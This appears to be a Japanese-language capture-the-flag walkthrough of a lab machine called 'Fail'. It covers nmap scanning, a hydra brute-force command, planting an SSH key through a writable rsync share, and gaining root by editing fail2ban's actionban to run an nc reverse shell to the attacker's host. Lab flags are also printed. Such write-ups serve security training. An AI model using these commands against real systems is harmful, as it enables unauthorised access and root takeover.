# Fail

| Variable          | Value        |
| ----------------- | ------------ |
| Remote IP         | 192.168.120.126  |
| Local IP          | 192.168.49.120   |
| Local listen port | 4444 |

## Nmap

- [x] Full TCP port scan

```bash
ports=$(nmap -p- --min-rate=1000 -T4 192.168.120.126 | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)
```

```bash
$ nmap -p$ports -sV -A 192.168.120.126
Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-23 20:38 JST
Nmap scan report for 192.168.120.126
Host is up (0.25s latency).

PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey:
|   2048 74:ba:20:23:89:92:62:02:9f:e7:3d:3b:83:d4:d9:6c (RSA)
|   256 54:8f:79:55:5a:b0:3a:69:5a:d5:72:39:64:fd:07:4e (ECDSA)
|_  256 7f:5d:10:27:62:ba:75:e9:bc:c8:4f:e2:72:87:d4:e2 (ED25519)
873/tcp open  rsync   (protocol version 31)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.38 seconds
```

- [x] Well-known UDP port scan

```bash
$ sudo nmap -Pn -sU --min-rate=10000 192.168.120.126
Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-23 20:37 JST
Nmap scan report for 192.168.120.126
Host is up.
All 1000 scanned ports on 192.168.120.126 are in ignored states.
Not shown: 1000 open|filtered udp ports (no-response)

Nmap done: 1 IP address (1 host up) scanned in 2.20 seconds
```

## TCP
### SSH - 22

- [x] Brute-force attack

```bash
hydra -L username.txt -P /usr/share/wordlists/metasploit/unix_passwords.txt ssh://192.168.120.126 -V -f -t 60
```

- [x] Check joe account login

```bash
$ ssh fox@192.168.120.126
fox@192.168.120.126's password:
Permission denied, please try again.
```

If `no matching host key type found` error occurs with this command, try the following.

```bash
ssh -oHostKeyAlgorithms=+ssh-dss username@192.168.120.126
```

```bash
ssh -oHostKeyAlgorithms=+ssh-rsa username@192.168.120.126
```

`openssh 7.9p1 Debian 10+deb10u2 (protocol 2.0)` の脆弱性を調べる．

特に無かった．

### Rsync - 873

> `rsync` はコンピュータと外付けハードドライブ間，ネットワーク化されたコンピュータ間でファイルを効率的に転送および同期するのに役立ちます．

[HackTricks 873 - Pentesting Rsync](https://book.hacktricks.xyz/network-services-pentesting/873-pentesting-rsync)

サーバーで共有フォルダを列挙すると，`fox` が見つかる．（分かりづらいが，`fox home` は `fox` ファイルの概要文）

```bash
$ nc -vn 192.168.120.126 873
(UNKNOWN) [192.168.120.126] 873 (rsync) open
@RSYNCD: 31.0
@RSYNCD: 31.0
#list
fox             fox home
@RSYNCD: EXIT
```

`rsync` コマンドでも列挙が可能．

```bash
$ rsync -av --list-only rsync://192.168.120.126:873
fox             fox home
```

`fox` フォルダの中身を取得する．

```bash
$ rsync -av rsync://192.168.120.126:873/fox ./rsync_fox
receiving incremental file list
created directory ./rsync_fox
./
.bash_history -> /dev/null
.bash_logout
.bashrc
.profile

sent 87 bytes  received 4,828 bytes  1,404.29 bytes/sec
total size is 4,562  speedup is 0.93
```

取得したファイルを確認したが，特に情報は無かった．

[HackTricks Manual Rsync](https://book.hacktricks.xyz/network-services-pentesting/873-pentesting-rsync#manual-rsync) によると，`rsync` コマンドはファイルのダウンロードだけでなく，アップロードを行うことも可能なため，`authorized_keys` をアップロードする．

`ssh-keygen` で鍵を作成する．

```bash
$ ssh-keygen
Generating public/private rsa key pair.
Enter file in which to save the key (/home/funa/.ssh/id_rsa): fox_rsa
Enter passphrase (empty for no passphrase):
Enter same passphrase again:
Your identification has been saved in fox_rsa
Your public key has been saved in fox_rsa.pub
The key fingerprint is:
SHA256:m23xVn1MfG5CeXZSnXq2OlYmxKzQ1df2sVTI9mVkglI funa@kali
The key's randomart image is:
+---[RSA 3072]----+
|           .EoooX|
|          . ..+@B|
|          ..+.*+&|
|         . . * %=|
|        S o o = B|
|         + + o *.|
|        o o o =  |
|         . . +   |
|            . .  |
+----[SHA256]-----+
```

`authorized_keys` に公開鍵を追記する．

```bash
$ cat fox_rsa.pub >> authorized_keys
```

`.ssh/` ディレクトリごとアップロードするため，`authorized_keys` を `.ssh/` ディレクトリに移動する．

```bash
$ mkdir .ssh

$ mv authorized_keys .ssh
```

`rsync` コマンドを使って `.ssh/` ディレクトリをアップロードする．

```bash
$ rsync -av .ssh rsync://192.168.120.126:873/fox
sending incremental file list
.ssh/
.ssh/authorized_keys

sent 711 bytes  received 39 bytes  300.00 bytes/sec
total size is 563  speedup is 0.75
```

共有ディレクトリを確認すると，アップロードが成功していることがわかる．

```bash
$ rsync -av --list-only rsync://192.168.120.126:873/fox
receiving incremental file list
drwxr-xr-x          4,096 2022/05/23 22:53:43 .
lrwxrwxrwx              9 2020/12/04 05:22:42 .bash_history -> /dev/null
-rw-r--r--            220 2019/04/18 13:12:36 .bash_logout
-rw-r--r--          3,526 2019/04/18 13:12:36 .bashrc
-rw-r--r--            807 2019/04/18 13:12:36 .profile
drwxr-xr-x          4,096 2022/05/23 22:49:12 .ssh
-rw-r--r--            563 2022/05/23 22:34:01 .ssh/authorized_keys

sent 21 bytes  received 198 bytes  87.60 bytes/sec
total size is 5,125  speedup is 23.40
```

秘密鍵の権限が `400` または `600` になっていることを確認し，`ssh` でログインする．

```bash
$ ll
-rw------- 1 funa funa   2590 May 23 22:25 fox_rsa

$ ssh -i fox_rsa fox@192.168.120.126
Linux fail 4.19.0-12-amd64 #1 SMP Debian 4.19.152-1 (2020-10-18) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
$ id
uid=1000(fox) gid=1001(fox) groups=1001(fox),1000(fail2ban)
```

`local.txt` を取得する．

```bash
$ pwd
/home
$ cat local.txt
4392719848b312d6962f4df6c0c2ea61
```

## Linux Privilege Escalation

- [x] List SUDO binaries

```bash
sudo -l
```

- [x] Find SUID binaries

```bash
fox@fail:/$ find / -perm -u=s -type f 2>/dev/null
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/bin/mount
/usr/bin/passwd
/usr/bin/su
/usr/bin/fusermount
/usr/bin/umount
/usr/bin/chfn
/usr/bin/chsh
/usr/bin/newgrp
/usr/bin/sudo
/usr/bin/gpasswd
```

If the owner of the binary is `root`, check [GTFOBins](https://gtfobins.github.io/).

`fail2ban` グループの権限があるファイルを列挙する．

```bash
fox@fail:/$ find / -group fail2ban -type f 2>/dev/null
/etc/fail2ban/action.d/firewallcmd-ipset.conf
/etc/fail2ban/action.d/nftables-multiport.conf
/etc/fail2ban/action.d/firewallcmd-multiport.conf
/etc/fail2ban/action.d/mail-whois.conf
/etc/fail2ban/action.d/ufw.conf
/etc/fail2ban/action.d/sendmail-common.conf
/etc/fail2ban/action.d/hostsdeny.conf
/etc/fail2ban/action.d/iptables-common.conf
/etc/fail2ban/action.d/iptables.conf
/etc/fail2ban/action.d/iptables-ipset-proto4.conf
/etc/fail2ban/action.d/shorewall.conf
/etc/fail2ban/action.d/shorewall-ipset-proto6.conf
/etc/fail2ban/action.d/sendmail-buffered.conf
/etc/fail2ban/action.d/abuseipdb.conf
/etc/fail2ban/action.d/sendmail-whois-ipmatches.conf
/etc/fail2ban/action.d/mail.conf
/etc/fail2ban/action.d/sendmail-whois-ipjailmatches.conf
/etc/fail2ban/action.d/nftables-allports.conf
/etc/fail2ban/action.d/npf.conf
/etc/fail2ban/action.d/apf.conf
/etc/fail2ban/action.d/badips.conf
/etc/fail2ban/action.d/iptables-multiport-log.conf
/etc/fail2ban/action.d/cloudflare.conf
/etc/fail2ban/action.d/sendmail-geoip-lines.conf
/etc/fail2ban/action.d/ipfilter.conf
/etc/fail2ban/action.d/xarf-login-attack.conf
/etc/fail2ban/action.d/sendmail-whois.conf
/etc/fail2ban/action.d/osx-ipfw.conf
/etc/fail2ban/action.d/route.conf
/etc/fail2ban/action.d/mail-buffered.conf
/etc/fail2ban/action.d/firewallcmd-common.conf
/etc/fail2ban/action.d/iptables-xt_recent-echo.conf
/etc/fail2ban/action.d/firewallcmd-rich-rules.conf
/etc/fail2ban/action.d/iptables-multiport.conf
/etc/fail2ban/action.d/firewallcmd-allports.conf
/etc/fail2ban/action.d/iptables-ipset-proto6.conf
/etc/fail2ban/action.d/sendmail-whois-lines.conf
/etc/fail2ban/action.d/iptables-allports.conf
/etc/fail2ban/action.d/badips.py
/etc/fail2ban/action.d/complain.conf
/etc/fail2ban/action.d/netscaler.conf
/etc/fail2ban/action.d/sendmail-whois-matches.conf
/etc/fail2ban/action.d/dummy.conf
/etc/fail2ban/action.d/sendmail.conf
/etc/fail2ban/action.d/nsupdate.conf
/etc/fail2ban/action.d/firewallcmd-rich-logging.conf
/etc/fail2ban/action.d/pf.conf
/etc/fail2ban/action.d/helpers-common.conf
/etc/fail2ban/action.d/nginx-block-map.conf
/etc/fail2ban/action.d/smtp.py
/etc/fail2ban/action.d/mail-whois-common.conf
/etc/fail2ban/action.d/dshield.conf
/etc/fail2ban/action.d/nftables-common.conf
/etc/fail2ban/action.d/mynetwatchman.conf
/etc/fail2ban/action.d/blocklist_de.conf
/etc/fail2ban/action.d/bsd-ipfw.conf
/etc/fail2ban/action.d/iptables-ipset-proto6-allports.conf
/etc/fail2ban/action.d/ipfw.conf
/etc/fail2ban/action.d/symbiosis-blacklist-allports.conf
/etc/fail2ban/action.d/mail-whois-lines.conf
/etc/fail2ban/action.d/osx-afctl.conf
/etc/fail2ban/action.d/firewallcmd-new.conf
/etc/fail2ban/action.d/iptables-new.conf
```

`pspy` を使って定期実行されているコマンドを確認する．

```bash local
$ python3 -m http.server 8000
```

ローカルから `pspy64` をダウンロードする．

```bash
fox@fail:~$ wget http://192.168.49.120:8000/pspy64
--2022-05-24 08:03:15--  http://192.168.49.120:8000/pspy64
Connecting to 192.168.49.120:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3078592 (2.9M) [application/octet-stream]
Saving to: ‘pspy64’

pspy64                        100%[================================================>]   2.94M  1.28MB/s    in 2.3s

2022-05-24 08:03:18 (1.28 MB/s) - ‘pspy64’ saved [3078592/3078592]
```

実行権限を付与して実行する．

`UID=0` つまり `root` ユーザで `systemctl restart fail2ban` が定期的に行われていることがわかる．

```bash
fox@fail:~$ ls -l
total 3008
-rw-r--r-- 1 fox fox 3078592 May 24 07:17 pspy64
fox@fail:~$ chmod +x pspy64
fox@fail:~$ ./pspy64
<snip>
2022/05/24 08:09:19 CMD: UID=0    PID=10     |
2022/05/24 08:09:19 CMD: UID=0    PID=1      | /sbin/init
2022/05/24 08:09:49 CMD: UID=0    PID=1678   |
2022/05/24 08:10:01 CMD: UID=0    PID=1679   | /usr/sbin/CRON -f
2022/05/24 08:10:01 CMD: UID=0    PID=1680   | /usr/sbin/CRON -f
2022/05/24 08:10:01 CMD: UID=0    PID=1681   | /bin/sh -c /usr/bin/systemctl restart fail2ban
2022/05/24 08:10:01 CMD: UID=0    PID=1682   | /sbin/init
2022/05/24 08:10:02 CMD: UID=0    PID=1683   | /sbin/init
2022/05/24 08:10:02 CMD: UID=0    PID=1684   | /sbin/init
2022/05/24 08:10:02 CMD: UID=0    PID=1686   | /usr/bin/python3 /usr/bin/fail2ban-server -xf start
2022/05/24 08:10:02 CMD: UID=0    PID=1687   | /usr/bin/python3 /usr/bin/fail2ban-server -xf start
```

`/etc/fail2ban` に移動し，`README.fox` というファイルを確認する．

`Fail2ban` は1分毎に再起動すること，`ACTION` ファイルを変更可能であることがわかる．

```bash
fox@fail:/etc/fail2ban$ ls
action.d       fail2ban.d  jail.conf  paths-arch.conf    paths-debian.conf    README.fox
fail2ban.conf  filter.d    jail.d     paths-common.conf  paths-opensuse.conf
fox@fail:/etc/fail2ban$ cat README.fox
Fail2ban restarts each 1 minute, change ACTION file following Security Policies. ROOT!
```

`/etc/fail2ban/jail.conf` を確認すると，`ssh` に対して ban 機能が有効化されていることがわかる．

また，ban の内容は `iptables-multiport` に書かれていることがわかる．

```bash
<sinp>
# Default banning action (e.g. iptables, iptables-new,
# iptables-multiport, shorewall, etc) It is used to define
# action_* variables. Can be overridden globally or per
# section within jail.local file
banaction = iptables-multiport
banaction_allports = iptables-allports

<snip>
#
# SSH servers
#

[sshd]
enabled = true
# To use more aggressive sshd modes set filter parameter "mode" in jail.local:
# normal (default), ddos, extra or aggressive (combines all).
# See "tests/files/logs/sshd" or "filter.d/sshd.conf" for usage example and details.
#mode   = normal
port    = ssh
logpath = %(sshd_log)s
backend = %(sshd_backend)s


[dropbear]

port     = ssh
logpath  = %(dropbear_log)s
backend  = %(dropbear_backend)s


[selinux-ssh]

port     = ssh
logpath  = %(auditd_log)s

<snip>
```

`iptables-multiport` にリバースシェルを実行する内容を書き込み，`ssh` ログインにわざと失敗して ban を実行することでリバースシェルを手に入れる．

リバースシェルに使う `netcat` が導入されており，パスが通っていることを確認する．

```bash
fox@fail:/etc/fail2ban$ which nc
/usr/bin/nc
fox@fail:/etc/fail2ban$ echo $PATH
/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
```

次に `bash` の場所を確認する．

```bash
fox@fail:/etc/fail2ban$ which bash
/usr/bin/bash
```

`/etc/fail2ban/action.d/iptables-multiport.conf` の `actionban` をリバースシェルに書き換える．

```bash iptables-multiport.conf
<snip>
# Option:  actionban
# Notes.:  command executed when banning an IP. Take care that the
#          command is executed with Fail2Ban user rights.
# Tags:    See jail.conf(5) man page
# Values:  CMD
#
# actionban = <iptables> -I f2b-<name> 1 -s <ip> -j <blocktype>
actionban = nc 192.168.49.120 4444 -e /usr/bin/bash
<snip>
```

ローカルでリバースシェルを待ち受ける．

```bash
$ nc -lvnp 4444
listening on [any] 4444 ...
```

`ssh` ログインにわざと失敗し，ban を実行する．

```bash
$ ssh fox@192.168.120.126
fox@192.168.120.126's password:
Permission denied, please try again.
fox@192.168.120.126's password:
```

リバースシェルを手に入れることができる．

```bash
$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [192.168.49.120] from (UNKNOWN) [192.168.120.126] 59918
id
uid=0(root) gid=0(root) groups=0(root)
<snip>
pwd
/root
ls
proof.txt
cat proof.txt
58934c0589dab67b763c66ccfc58e4e6
```





